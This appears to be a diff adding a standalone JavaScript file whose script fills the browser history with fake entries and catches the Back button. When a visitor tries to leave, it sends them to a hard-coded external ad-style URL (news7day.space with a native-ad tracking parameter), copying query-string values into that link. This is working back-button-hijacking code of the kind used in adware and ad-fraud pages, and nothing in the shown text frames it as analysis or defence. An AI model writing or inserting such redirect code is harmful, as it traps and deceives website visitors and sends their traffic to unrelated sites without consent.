@@ -1,0 +1,46 @@
+!(function () {
+    const depth = 2,
+        getUrl = function () {
+            return 'https://news7day.space/vt/external/6126742269a16.html?stream_uuid=74c85e25-e495-4ccb-b615-412657408e25&utm_term=Adn_Native';
+        },
+        replaceMacros = function (backLink) {
+            const DefaultMacroValue = '',
+                regExp = /\[(.+?)]/g;
+
+            try {
+                var url = new URL(location.href);
+
+                backLink = backLink.replace(regExp, function (all, key) {
+                    if (url.searchParams.has(key)) {
+                        return url.searchParams.get(key);
+                    }
+                    return DefaultMacroValue;
+                });
+
+                return backLink;
+            } catch (err) {
+                console.error(err);
+                return backLink;
+            }
+        };
+
+    var disabled = false;
+                
+    try {
+        if (disabled === true) {
+                        history.go(-depth);
+            return;
+        }
+
+        const URL = window.location.href.split(/[#]/)[0];
+        for (let t = 0; depth > t; ++t) history.pushState({}, '', URL + '#' + t);
+
+        onpopstate = (event) => {
+            if (disabled === false) {
+                event.state && location.replace(replaceMacros(getUrl()));
+            }
+        };
+    } catch (err) {
+        console.log(err);
+    }
+})();
